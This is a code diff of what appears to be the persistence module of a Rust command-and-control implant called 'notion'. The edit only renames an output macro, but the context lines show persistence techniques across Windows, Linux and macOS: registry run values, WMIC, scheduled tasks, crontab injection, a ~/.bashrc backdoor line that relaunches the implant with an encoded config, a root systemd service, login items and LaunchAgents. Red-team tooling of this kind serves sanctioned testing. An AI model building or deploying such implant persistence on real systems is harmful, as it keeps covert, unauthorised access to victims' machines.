@@ -2,7 +2,7 @@ use litcrypt::lc;
 use std::error::Error;
 use std::env::{var, args};
 use is_root::is_root;
-use crate::cmd::{CommandArgs, shell, save, notion_out};
+use crate::cmd::{CommandArgs, shell, save, command_out};
 #[cfg(not(windows))] use std::fs::{create_dir, copy, write};
 #[cfg(windows)] use std::path::Path;
 #[cfg(windows)] use winreg::{RegKey};
@@ -43,7 +43,7 @@ pub async fn handle(cmd_args: &mut CommandArgs, config_options: &mut ConfigOptio
                         Err(e) => { return Ok(e.to_string())}
                     }
                 } else {
-                    return notion_out!("Couldn't get APPDATA location");
+                    return command_out!("Couldn't get APPDATA location");
                 };
             },
             "registry" => {
@@ -62,9 +62,9 @@ pub async fn handle(cmd_args: &mut CommandArgs, config_options: &mut ConfigOptio
                         REG_OPENED_EXISTING_KEY => logger.info(log_out!("An existing key has been opened")),
                     };
                     key.set_value("Notion", &persist_path)?;
-                    notion_out!("Persistence accomplished")
+                    command_out!("Persistence accomplished")
                 } else {
-                    notion_out!("LOCALDATA undefined")
+                    command_out!("LOCALDATA undefined")
                 }
             },
             "wmic" => {
@@ -113,11 +113,11 @@ pub async fn handle(cmd_args: &mut CommandArgs, config_options: &mut ConfigOptio
                         }
                 
                     } else {
-                        return notion_out!("Could not locate APPDATA.");
+                        return command_out!("Could not locate APPDATA.");
                     }
                 }
                 else{
-                    return notion_out!("[-] WMIC persistence requires admin privileges.");
+                    return command_out!("[-] WMIC persistence requires admin privileges.");
                 }
             },
             "schtasks" => {
@@ -164,17 +164,17 @@ pub async fn handle(cmd_args: &mut CommandArgs, config_options: &mut ConfigOptio
                         }
                 
                     } else {
-                        return notion_out!("Could not locate APPDATA.");
+                        return command_out!("Could not locate APPDATA.");
                     }
                 }
                 else{
-                    return notion_out!("[-] Scheduled task persistence requires admin privileges.");
+                    return command_out!("[-] Scheduled task persistence requires admin privileges.");
                 }
             },
 
 
 
-            _ => notion_out!("That's not a persistence method!")
+            _ => command_out!("That's not a persistence method!")
         }
     }
 
@@ -202,12 +202,12 @@ pub async fn handle(cmd_args: &mut CommandArgs, config_options: &mut ConfigOptio
                         format!("(crontab -l 2>/dev/null; echo '{cron_string}') | crontab - ")
                     );
                     if let Ok(_) = shell::handle(&mut cron_args).await {
-                        notion_out!("Cronjob added!")
+                        command_out!("Cronjob added!")
                     } else {
-                        notion_out!("Could not make cronjob")
+                        command_out!("Could not make cronjob")
                     }
                 } else {
-                    notion_out!("Could not copy app to destination")
+                    command_out!("Could not copy app to destination")
                 }
             }
             "bashrc"  => {
@@ -224,12 +224,12 @@ pub async fn handle(cmd_args: &mut CommandArgs, config_options: &mut ConfigOptio
                         vec![format!("echo '{app_dir}/notion -b {b64_config} & disown' >> ~/.bashrc ")]
                     );
                     if let Ok(_) = shell::handle(&mut bashrc_args).await {
-                        notion_out!("Bash Backdoored!")
+                        command_out!("Bash Backdoored!")
                     } else {
-                        notion_out!("Could not modify bashrc")
+                        command_out!("Could not modify bashrc")
                     }
                 } else {
-                    notion_out!("Could not copy app to destination")
+                    command_out!("Could not copy app to destination")
                 }
             },
             "service" => {
@@ -263,13 +263,13 @@ WantedBy=multi-user.target"
                         );
                         return shell::handle(&mut systemd_args).await;
                     } else {
-                        return notion_out!("Could not copy service file");
+                        return command_out!("Could not copy service file");
                     }
                 } else {
-                    return notion_out!("Need to be root first. Try elevate.");
+                    return command_out!("Need to be root first. Try elevate.");
                 }
             }, 
-            _         => notion_out!("Unknown persistence method!")
+            _         => command_out!("Unknown persistence method!")
         }
     }
 
@@ -296,12 +296,12 @@ WantedBy=multi-user.target"
                         vec![osascript_string]
                     );
                     if let Ok(_) = shell::handle(&mut applescript_args).await {
-                        notion_out!("Login item created!")
+                        command_out!("Login item created!")
                     } else {
-                        notion_out!("Could not create login item")
+                        command_out!("Could not create login item")
                     }
                 } else {
-                    notion_out!("Could not copy app to destination")
+                    command_out!("Could not copy app to destination")
                 }
 
             },
@@ -345,10 +345,10 @@ r#"<?xml version="1.0" encoding="UTF-8"?>
                     )?;
                     Ok(format!("LaunchAgent written to {launch_agent_dir}"))
                 } else {
-                    return notion_out!("Could not copy app to destination");
+                    return command_out!("Could not copy app to destination");
                 }
             },
-            _ => notion_out!("Unknown persistence method!")
+            _ => command_out!("Unknown persistence method!")
         }
 
     }
